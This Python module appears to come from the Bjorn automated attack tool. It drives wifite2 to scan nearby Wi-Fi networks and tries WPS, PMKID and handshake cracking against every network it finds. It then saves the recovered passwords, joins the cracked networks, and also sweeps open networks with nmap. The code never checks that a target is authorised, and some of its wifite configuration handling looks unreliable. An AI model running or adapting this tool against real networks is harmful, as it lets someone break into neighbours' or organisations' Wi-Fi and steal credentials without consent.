"""
wifite2_connector.py - This script performs wireless network scanning and attacks using wifite2.
It scans for open networks, attempts to crack them, and connects to any successfully cracked networks.
"""

import os
import subprocess
import threading
import logging
import time
import json
import re
from datetime import datetime
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="wifite2_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "Wifite2Connector"
b_module = "wifite2_connector"
b_status = "wireless_attack"
b_port = None  # Wireless attacks don't use specific ports
b_parent = None

class Wifite2Connector:
    """
    Class to handle wireless network scanning and attacks using wifite2.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.console = Console()
        self.wifite_results_dir = os.path.join(shared_data.data_dir, "output", "wireless_results")
        self.cracked_networks_file = os.path.join(self.wifite_results_dir, "cracked_networks.json")
        self.available_networks_file = os.path.join(self.wifite_results_dir, "available_networks.json")

        # Create directories if they don't exist
        os.makedirs(self.wifite_results_dir, exist_ok=True)

        # Initialize results storage
        self.cracked_networks = []
        self.available_networks = []
        self.alfa_interface = None  # Store the detected Alfa adapter interface
        self.load_existing_results()

        logger.info("Wifite2Connector initialized.")

    def get_primary_network_info(self):
        """
        Get information about the primary network that Bjorn should connect to.
        Returns a dictionary with SSID and other connection info.
        """
        try:
            # Get current connection info
            result = subprocess.run(['nmcli', '-t', '-f', 'SSID,DEVICE,TYPE', 'connection', 'show', '--active'],
                                  capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if line and 'wifi' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            return {
                                'ssid': parts[0],
                                'device': parts[1],
                                'type': parts[2] if len(parts) > 2 else 'wifi'
                            }

            # Fallback: try to get from wpa_supplicant
            try:
                with open('/etc/wpa_supplicant/wpa_supplicant.conf', 'r') as f:
                    content = f.read()
                    # Look for network blocks
                    network_blocks = re.findall(r'network\s*=\s*\{([^}]+)\}', content, re.DOTALL)
                    for block in network_blocks:
                        ssid_match = re.search(r'ssid\s*=\s*"([^"]+)"', block)
                        if ssid_match:
                            return {'ssid': ssid_match.group(1), 'device': 'wlan0', 'type': 'wifi'}
            except Exception as e:
                logger.debug(f"Could not read wpa_supplicant.conf: {e}")

            return None
        except Exception as e:
            logger.error(f"Error getting primary network info: {e}")
            return None

    def save_current_connection(self):
        """
        Save the current network connection information.
        """
        try:
            result = subprocess.run(['nmcli', '-t', '-f', 'NAME,DEVICE,TYPE', 'connection', 'show', '--active'],
                                  capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if line and 'wifi' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            self.primary_connection = {
                                'name': parts[0],
                                'device': parts[1],
                                'type': parts[2] if len(parts) > 2 else 'wifi'
                            }
                            logger.info(f"Saved primary connection: {self.primary_connection}")
                            return True

            return False
        except Exception as e:
            logger.error(f"Error saving current connection: {e}")
            return False

    def scan_for_unsecured_networks(self):
        """
        Scan for unsecured (open) wireless networks.
        Returns a list of unsecured networks.
        """
        try:
            # Use wifite2 to scan for networks
            cmd = ["wifite", "--showb", "--kill", "--quiet"]

            if self.alfa_interface:
                cmd.extend(["--interface", self.alfa_interface])

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                networks = self.parse_network_scan(result.stdout)
                # Filter for unsecured networks
                unsecured_networks = [net for net in networks if net.get('encryption', '').lower() in ['open', 'none', '']]
                logger.info(f"Found {len(unsecured_networks)} unsecured networks")
                return unsecured_networks
            else:
                logger.error(f"Failed to scan for networks: {result.stderr}")
                return []

        except Exception as e:
            logger.error(f"Error scanning for unsecured networks: {e}")
            return []

    def connect_to_unsecured_network(self, network):
        """
        Connect to an unsecured network for scanning purposes.
        """
        try:
            ssid = network.get('ssid', '')
            if not ssid:
                logger.error("No SSID provided for connection")
                return False

            logger.info(f"Connecting to unsecured network: {ssid}")

            # Disconnect from current network first
            subprocess.run(['nmcli', 'device', 'disconnect', 'wlan0'],
                         capture_output=True, timeout=10)

            # Connect to the unsecured network
            cmd = ['nmcli', 'device', 'wifi', 'connect', ssid]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                logger.info(f"Successfully connected to unsecured network: {ssid}")
                return True
            else:
                logger.error(f"Failed to connect to {ssid}: {result.stderr}")
                return False

        except Exception as e:
            logger.error(f"Error connecting to unsecured network: {e}")
            return False

    def reconnect_to_primary_network(self):
        """
        Reconnect to the primary network that was saved earlier.
        """
        try:
            if not hasattr(self, 'primary_connection') or not self.primary_connection:
                logger.warning("No primary connection saved, attempting to reconnect to default")
                # Try to reconnect to the default network
                result = subprocess.run(['nmcli', 'device', 'reapply'],
                                     capture_output=True, text=True, timeout=30)
                return result.returncode == 0

            # Disconnect from current network
            subprocess.run(['nmcli', 'device', 'disconnect', 'wlan0'],
                         capture_output=True, timeout=10)

            # Reconnect to primary network
            connection_name = self.primary_connection.get('name', '')
            if connection_name:
                cmd = ['nmcli', 'connection', 'up', connection_name]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

                if result.returncode == 0:
                    logger.info(f"Successfully reconnected to primary network: {connection_name}")
                    return True
                else:
                    logger.error(f"Failed to reconnect to primary network: {result.stderr}")
                    return False
            else:
                logger.error("No primary connection name available")
                return False

        except Exception as e:
            logger.error(f"Error reconnecting to primary network: {e}")
            return False

    def perform_idle_network_scanning(self):
        """
        Perform network scanning during IDLE state.
        Connects to unsecured networks, performs scanning, then reconnects to primary.
        """
        try:
            logger.info("Starting IDLE network scanning...")

            # Save current connection
            if not self.save_current_connection():
                logger.warning("Could not save current connection, proceeding anyway")

            # Scan for unsecured networks
            unsecured_networks = self.scan_for_unsecured_networks()

            if not unsecured_networks:
                logger.info("No unsecured networks found for IDLE scanning")
                return True

            # Try to connect to each unsecured network and perform scanning
            for network in unsecured_networks[:3]:  # Limit to 3 networks to avoid excessive scanning
                ssid = network.get('ssid', '')
                logger.info(f"Attempting to connect to unsecured network: {ssid}")

                if self.connect_to_unsecured_network(network):
                    # Perform network scanning while connected
                    logger.info(f"Connected to {ssid}, performing network scan...")

                    # Wait a bit for connection to stabilize
                    time.sleep(5)

                    # Perform network scanning (this could be nmap, ping sweep, etc.)
                    self.perform_network_scan_from_unsecured_network(network)

                    # Disconnect and try next network
                    subprocess.run(['nmcli', 'device', 'disconnect', 'wlan0'],
                                 capture_output=True, timeout=10)
                    time.sleep(2)

            # Reconnect to primary network
            logger.info("Reconnecting to primary network...")
            if self.reconnect_to_primary_network():
                logger.info("Successfully reconnected to primary network")
                return True
            else:
                logger.error("Failed to reconnect to primary network")
                return False

        except Exception as e:
            logger.error(f"Error during IDLE network scanning: {e}")
            # Try to reconnect to primary network as fallback
            self.reconnect_to_primary_network()
            return False

    def perform_network_scan_from_unsecured_network(self, network):
        """
        Perform network scanning while connected to an unsecured network.
        """
        try:
            ssid = network.get('ssid', '')
            logger.info(f"Performing network scan from unsecured network: {ssid}")

            # Get the network we're connected to
            result = subprocess.run(['ip', 'route', 'show', 'default'],
                                 capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                # Extract gateway IP
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if 'default' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            gateway = parts[2]
                            logger.info(f"Gateway IP: {gateway}")

                            # Perform a quick network scan
                            self.scan_network_from_gateway(gateway)
                            break

        except Exception as e:
            logger.error(f"Error performing network scan from unsecured network: {e}")

    def scan_network_from_gateway(self, gateway):
        """
        Perform a quick network scan from the given gateway.
        """
        try:
            # Extract network from gateway (assuming /24)
            network_parts = gateway.split('.')
            if len(network_parts) == 4:
                network = f"{network_parts[0]}.{network_parts[1]}.{network_parts[2]}.0/24"
                logger.info(f"Scanning network: {network}")

                # Quick ping sweep
                cmd = ['nmap', '-sn', '--max-retries', '1', '--host-timeout', '5s', network]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

                if result.returncode == 0:
                    # Parse results for live hosts
                    lines = result.stdout.split('\n')
                    live_hosts = []
                    for line in lines:
                        if 'Nmap scan report for' in line:
                            ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                            if ip_match:
                                live_hosts.append(ip_match.group(1))

                    logger.info(f"Found {len(live_hosts)} live hosts in network {network}")

                    # Save results
                    scan_results = {
                        'network': network,
                        'gateway': gateway,
                        'live_hosts': live_hosts,
                        'scan_time': datetime.now().isoformat()
                    }

                    # Save to wireless results directory
                    scan_file = os.path.join(self.wifite_results_dir, f"idle_scan_{network.replace('/', '_')}.json")
                    with open(scan_file, 'w') as f:
                        json.dump(scan_results, f, indent=4)

                    logger.info(f"Saved scan results to {scan_file}")

        except Exception as e:
            logger.error(f"Error scanning network from gateway: {e}")

    def detect_alfa_wifi_adapter(self):
        """
        Detect if an Alfa USB wifi adapter is connected.
        Returns True if an Alfa adapter is found, False otherwise.
        Also stores the interface name in self.alfa_interface.
        """
        try:
            # Check for USB devices using lsusb
            result = subprocess.run(['lsusb'], capture_output=True, text=True, timeout=10)

            if result.returncode != 0:
                logger.error(f"Failed to execute lsusb: {result.stderr}")
                return False

            # Common Alfa adapter vendor IDs and product names
            alfa_identifiers = [
                'alfa', 'ALFA', 'Alfa',
                'AWUS036ACH', 'AWUS036NHA', 'AWUS036NEH', 'AWUS036AC',
                'AWUS051NH', 'AWUS036H', 'AWUS036NH'
            ]

            usb_output = result.stdout.lower()
            alfa_detected_in_usb = False

            # Check if any Alfa identifier is found in the USB output
            for identifier in alfa_identifiers:
                if identifier.lower() in usb_output:
                    logger.info(f"Alfa wifi adapter detected in USB: {identifier}")
                    alfa_detected_in_usb = True
                    break

            # Also check for wifi interfaces that might be from Alfa adapters
            try:
                # Check for wifi interfaces
                iw_result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=10)
                if iw_result.returncode == 0:
                    # Look for interfaces that might be from USB adapters
                    interfaces = iw_result.stdout
                    if 'phy' in interfaces and 'wlan' in interfaces:
                        logger.info("USB wifi adapter detected, checking if it's Alfa...")

                        # Check if the adapter supports monitor mode (common for Alfa adapters)
                        for line in interfaces.split('\n'):
                            if 'wlan' in line:
                                interface = line.strip().split()[1] if len(line.strip().split()) > 1 else None
                                if interface:
                                    # Test if interface supports monitor mode
                                    test_result = subprocess.run(['iw', interface, 'set', 'monitor', 'none'],
                                                              capture_output=True, text=True, timeout=5)
                                    if test_result.returncode == 0:
                                        # Restore managed mode
                                        subprocess.run(['iw', interface, 'set', 'type', 'managed'],
                                                     capture_output=True, timeout=5)
                                        logger.info(f"Monitor mode capable interface found: {interface}")

                                        # If we detected Alfa in USB or this is likely an Alfa adapter
                                        if alfa_detected_in_usb or self._is_likely_alfa_interface(interface):
                                            self.alfa_interface = interface
                                            logger.info(f"Alfa adapter interface identified: {interface}")
                                            return True
            except Exception as e:
                logger.debug(f"Error checking wifi interfaces: {e}")

            logger.info("No Alfa wifi adapter detected")
            return False

        except subprocess.TimeoutExpired:
            logger.error("Timeout while detecting USB wifi adapter")
            return False
        except Exception as e:
            logger.error(f"Error detecting Alfa wifi adapter: {e}")
            return False

    def _is_likely_alfa_interface(self, interface):
        """
        Check if an interface is likely from an Alfa adapter.
        """
        try:
            # Get interface details
            result = subprocess.run(['iw', interface, 'info'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                # Look for characteristics common to Alfa adapters
                output = result.stdout.lower()
                # Alfa adapters often have specific driver names or capabilities
                alfa_indicators = ['rtl', 'ath9k', 'ath10k', 'mac80211']
                for indicator in alfa_indicators:
                    if indicator in output:
                        return True
        except Exception as e:
            logger.debug(f"Error checking interface details: {e}")

        return False

    def _ensure_monitor_mode(self):
        """
        Ensure the Alfa adapter is in monitor mode for attacks.
        Returns True if successful, False otherwise.
        """
        if not self.alfa_interface:
            logger.warning("No Alfa interface detected, cannot set monitor mode")
            return False

        try:
            # Check current mode
            result = subprocess.run(['iw', self.alfa_interface, 'info'],
                                  capture_output=True, text=True, timeout=5)

            if result.returncode == 0:
                if 'type monitor' in result.stdout.lower():
                    logger.info(f"Interface {self.alfa_interface} already in monitor mode")
                    return True
                else:
                    # Set to monitor mode
                    logger.info(f"Setting interface {self.alfa_interface} to monitor mode")
                    monitor_result = subprocess.run(['iw', self.alfa_interface, 'set', 'type', 'monitor'],
                                                 capture_output=True, text=True, timeout=10)

                    if monitor_result.returncode == 0:
                        logger.info(f"Successfully set {self.alfa_interface} to monitor mode")
                        return True
                    else:
                        logger.error(f"Failed to set {self.alfa_interface} to monitor mode: {monitor_result.stderr}")
                        return False
            else:
                logger.error(f"Failed to get interface info for {self.alfa_interface}")
                return False

        except Exception as e:
            logger.error(f"Error setting monitor mode: {e}")
            return False

    def _restore_managed_mode(self):
        """
        Restore the Alfa adapter to managed mode after attacks.
        """
        if not self.alfa_interface:
            return

        try:
            logger.info(f"Restoring interface {self.alfa_interface} to managed mode")
            result = subprocess.run(['iw', self.alfa_interface, 'set', 'type', 'managed'],
                                  capture_output=True, text=True, timeout=10)

            if result.returncode == 0:
                logger.info(f"Successfully restored {self.alfa_interface} to managed mode")
            else:
                logger.warning(f"Failed to restore {self.alfa_interface} to managed mode: {result.stderr}")

        except Exception as e:
            logger.error(f"Error restoring managed mode: {e}")

    def load_existing_results(self):
        """Load existing cracked networks and available networks from files."""
        try:
            if os.path.exists(self.cracked_networks_file):
                with open(self.cracked_networks_file, 'r') as f:
                    self.cracked_networks = json.load(f)
                logger.info(f"Loaded {len(self.cracked_networks)} existing cracked networks")

            if os.path.exists(self.available_networks_file):
                with open(self.available_networks_file, 'r') as f:
                    self.available_networks = json.load(f)
                logger.info(f"Loaded {len(self.available_networks)} existing available networks")
        except Exception as e:
            logger.error(f"Error loading existing results: {e}")

    def save_results(self):
        """Save cracked networks and available networks to files."""
        try:
            with open(self.cracked_networks_file, 'w') as f:
                json.dump(self.cracked_networks, f, indent=4)

            with open(self.available_networks_file, 'w') as f:
                json.dump(self.available_networks, f, indent=4)
        except Exception as e:
            logger.error(f"Error saving results: {e}")

    def scan_for_networks(self):
        """
        Scan for available wireless networks using wifite2.
        """
        logger.info("Scanning for wireless networks...")
        self.shared_data.bjornorch_status = "Wifite2Scan"

        try:
            # Ensure Alfa adapter is in monitor mode if detected
            if self.alfa_interface:
                if not self._ensure_monitor_mode():
                    logger.error("Failed to set Alfa adapter to monitor mode")
                    return []
                logger.info(f"Using Alfa adapter interface: {self.alfa_interface}")
            else:
                logger.warning("No specific interface specified, wifite2 will use default")

            # Use wifite2 to scan for networks with specific interface
            cmd = ["wifite", "--showb", "--kill", "--quiet"]

            # Add interface specification if Alfa adapter is detected
            if self.alfa_interface:
                cmd.extend(["--interface", self.alfa_interface])

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                networks = self.parse_network_scan(result.stdout)
                self.available_networks = networks
                self.save_results()
                logger.info(f"Found {len(networks)} wireless networks")
                return networks
            else:
                logger.error(f"Wifite2 scan failed: {result.stderr}")
                return []

        except subprocess.TimeoutExpired:
            logger.error("Wifite2 scan timed out")
            return []
        except Exception as e:
            logger.error(f"Error scanning for networks: {e}")
            return []

    def parse_network_scan(self, output):
        """
        Parse wifite2 scan output to extract network information.
        """
        networks = []
        lines = output.split('\n')

        for line in lines:
            # Look for network information in wifite2 output
            # This pattern may need adjustment based on actual wifite2 output format
            match = re.search(r'(\S+)\s+(\S+)\s+(\d+)\s+(\S+)\s+(\S+)', line)
            if match:
                ssid, bssid, channel, encryption, signal = match.groups()
                networks.append({
                    'ssid': ssid,
                    'bssid': bssid,
                    'channel': int(channel),
                    'encryption': encryption,
                    'signal': signal,
                    'discovered_at': datetime.now().isoformat()
                })

        return networks

    def attack_network(self, network):
        """
        Attack a specific wireless network using wifite2.
        """
        logger.info(f"Attacking network: {network['ssid']} ({network['bssid']})")

        try:
            # Ensure Alfa adapter is in monitor mode if detected
            if self.alfa_interface:
                if not self._ensure_monitor_mode():
                    logger.error("Failed to set Alfa adapter to monitor mode for attack")
                    return False

            # Create a temporary configuration file for this attack
            config_file = os.path.join(self.wifite_results_dir, f"attack_{network['bssid'].replace(':', '')}.conf")

            with open(config_file, 'w') as f:
                f.write(f"targets={network['bssid']}\n")

                # Use configuration settings
                if self.shared_data.wireless_wps_priority:
                    f.write("wps-only\n")
                if self.shared_data.wireless_pmkid_enabled:
                    f.write("pmkid\n")
                if self.shared_data.wireless_handshake_enabled:
                    f.write("--wpa\n")

                # Add interface specification if Alfa adapter is detected
                if self.alfa_interface:
                    f.write(f"interface={self.alfa_interface}\n")
                    logger.info(f"Using Alfa adapter interface for attack: {self.alfa_interface}")

                f.write("--kill\n")
                f.write("--quiet\n")

            # Run wifite2 attack with configured timeout
            cmd = ["wifite", "--conf", config_file]
            timeout = getattr(self.shared_data, 'wireless_attack_timeout', 300)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

            # Clean up config file
            os.remove(config_file)

            # Restore managed mode after attack
            if self.alfa_interface:
                self._restore_managed_mode()

            if result.returncode == 0:
                # Check if attack was successful
                if self.check_attack_success(result.stdout, network):
                    logger.success(f"Successfully cracked network: {network['ssid']}")
                    # Update wireless statistics
                    self.shared_data.wirelessnbr += 1
                    self.shared_data.update_stats()
                    return True
                else:
                    logger.info(f"Attack on {network['ssid']} was not successful")
                    return False
            else:
                logger.error(f"Attack failed: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            logger.error(f"Attack on {network['ssid']} timed out")
            return False
        except Exception as e:
            logger.error(f"Error attacking network {network['ssid']}: {e}")
            return False

    def check_attack_success(self, output, network):
        """
        Check if the wifite2 attack was successful by parsing the output.
        """
        # Look for success indicators in wifite2 output
        success_indicators = [
            "WPS PIN:",
            "WPA PSK:",
            "Password:",
            "Successfully cracked",
            "Key found:"
        ]

        for indicator in success_indicators:
            if indicator in output:
                # Extract the password/key
                password = self.extract_password(output, indicator)
                if password:
                    network['password'] = password
                    network['cracked_at'] = datetime.now().isoformat()
                    network['attack_method'] = self.determine_attack_method(output)
                    self.cracked_networks.append(network)
                    self.save_results()
                    return True

        return False

    def extract_password(self, output, indicator):
        """
        Extract password/key from wifite2 output.
        """
        lines = output.split('\n')
        for i, line in enumerate(lines):
            if indicator in line:
                # Try to extract the password from the next line or current line
                if ':' in line:
                    password = line.split(':', 1)[1].strip()
                    if password:
                        return password
                elif i + 1 < len(lines):
                    password = lines[i + 1].strip()
                    if password and not password.startswith('['):
                        return password
        return None

    def determine_attack_method(self, output):
        """
        Determine which attack method was successful.
        """
        if "WPS PIN:" in output:
            return "WPS_PixieDust"
        elif "WPA PSK:" in output:
            return "WPA_Handshake"
        elif "PMKID" in output:
            return "PMKID"
        else:
            return "Unknown"

    def connect_to_network(self, network):
        """
        Connect to a successfully cracked wireless network.
        """
        if 'password' not in network:
            logger.error(f"No password available for network {network['ssid']}")
            return False

        logger.info(f"Connecting to network: {network['ssid']}")

        try:
            # Use nmcli to connect to the network
            cmd = [
                "nmcli", "device", "wifi", "connect", network['ssid'],
                "password", network['password']
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                logger.success(f"Successfully connected to {network['ssid']}")
                network['connected_at'] = datetime.now().isoformat()
                self.save_results()
                return True
            else:
                logger.error(f"Failed to connect to {network['ssid']}: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            logger.error(f"Connection to {network['ssid']} timed out")
            return False
        except Exception as e:
            logger.error(f"Error connecting to network {network['ssid']}: {e}")
            return False

    def execute_wireless_attack(self):
        """
        Execute the complete wireless attack process.
        """
        logger.info("Starting wireless attack process...")
        self.shared_data.bjornorch_status = "Wifite2Attack"

        # Check if wireless scanning is enabled
        if not getattr(self.shared_data, 'wireless_scan_enabled', True):
            logger.info("Wireless scanning is disabled in configuration")
            return False

        # Check if Alfa USB wifi adapter is connected (if required by configuration)
        if getattr(self.shared_data, 'wireless_require_alfa_adapter', True):
            if not self.detect_alfa_wifi_adapter():
                logger.info("No Alfa USB wifi adapter detected. Wireless attacks require an Alfa adapter.")
                return False
        else:
            logger.info("Alfa adapter requirement disabled in configuration")

        # Step 1: Scan for networks
        networks = self.scan_for_networks()
        if not networks:
            logger.info("No wireless networks found")
            return False

        # Step 2: Attack networks (focus on WPS-enabled networks first if configured)
        if getattr(self.shared_data, 'wireless_wps_priority', True):
            wps_networks = [n for n in networks if 'WPS' in n.get('encryption', '')]
            other_networks = [n for n in networks if 'WPS' not in n.get('encryption', '')]

            # Attack WPS networks first
            for network in wps_networks:
                if self.attack_network(network):
                    # Try to connect to successfully cracked network
                    if self.connect_to_network(network):
                        logger.success(f"Successfully connected to cracked network: {network['ssid']}")
                        return True

            # Attack other networks if no WPS networks were successful
            for network in other_networks:
                if self.attack_network(network):
                    # Try to connect to successfully cracked network
                    if self.connect_to_network(network):
                        logger.success(f"Successfully connected to cracked network: {network['ssid']}")
                        return True
        else:
            # Attack all networks without WPS priority
            for network in networks:
                if self.attack_network(network):
                    # Try to connect to successfully cracked network
                    if self.connect_to_network(network):
                        logger.success(f"Successfully connected to cracked network: {network['ssid']}")
                        return True

        logger.info("No networks were successfully cracked")
        return False

    def execute(self, ip=None, port=None, row=None, status_key=None):
        """
        Execute the wireless attack and update status.
        """
        logger.info("Executing Wifite2Connector...")
        success = self.execute_wireless_attack()
        return 'success' if success else 'failed'

    def get_statistics(self):
        """
        Get statistics about wireless attacks.
        """
        return {
            'total_networks_found': len(self.available_networks),
            'networks_cracked': len(self.cracked_networks),
            'networks_connected': len([n for n in self.cracked_networks if 'connected_at' in n]),
            'last_scan': max([n.get('discovered_at', '') for n in self.available_networks]) if self.available_networks else None,
            'last_crack': max([n.get('cracked_at', '') for n in self.cracked_networks]) if self.cracked_networks else None
        }

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        wifite2_connector = Wifite2Connector(shared_data)
        logger.info("Starting wireless attack...")

        success = wifite2_connector.execute()
        stats = wifite2_connector.get_statistics()

        logger.info(f"Wireless attack completed. Success: {success}")
        logger.info(f"Statistics: {stats}")

        exit(0 if success else 1)
    except Exception as e:
        logger.error(f"Error: {e}")
        exit(1)